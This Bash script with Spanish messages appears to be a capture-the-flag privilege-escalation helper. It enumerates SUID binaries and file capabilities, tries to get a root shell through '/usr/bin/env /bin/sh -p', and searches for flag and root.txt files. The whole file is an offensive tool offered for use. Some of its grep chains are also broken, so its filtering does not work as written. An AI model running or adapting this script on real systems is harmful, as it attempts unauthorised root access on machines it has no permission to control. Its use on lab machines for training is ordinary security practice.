#!/bin/bash

permisos_suid() {
    
    echo -e "\nBuscando binarios con bit setuid..."
    echo -e "=====================================\n"

    result=$(find / -perm -4000 2>/dev/null)

    echo -e "$result" | grep pkexec || grep nmap || grep python

}

capabilities() {

    echo -e "\nBuscando binarios con capacidades..."
    echo -e "======================================\n"

    result=$(getcap -r / 2>/dev/null)

    echo -e "$result" | grep python || grep ruby 
 
}

flagsearch(){
    tput cnorm; echo -ne "\nQuieres buscar flag.txt? [S/N]: " && read op
    if [ "$op" == "s" ] || [ "$op" == "S" ]; then
        tput civis
        echo -e "\nBuscando flags.txt..."
        echo -e "======================\n"
        search=$(find / -name "flag*.txt" 2>/dev/null)
        echo -e "$search"
        
        echo -e "\nBuscando flags roots..."
        echo -e "========================\n"
        root=$(find / -name "root.txt" 2>/dev/null)
        echo -e "$root"
        for num in {1..3}; do
            find / -name "root${num}.txt" > /dev/null 2>&1
            if [ "$(echo $?)" -eq 0 ]; then
                echo -e "$(find / -name "root${num}.txt" 2>/dev/null)"
            fi
        done
    fi

}

env(){
    echo -e "\nIntentando ser root con env..."
    echo -e "==============================\n"
    /usr/bin/env /bin/sh -p 2>/dev/null
    if [ $(id -u) -ne 0 ]; then
        echo -e "No se pudo"
    else 
        echo -e "Se encontro una vulnerabilidad, ejecuta este comando cuando salgas del script -> /usr/bin/env /bin/sh -p"
    fi
    
}

clear; tput civis
permisos_suid
capabilities
env
flagsearch
tput cnorm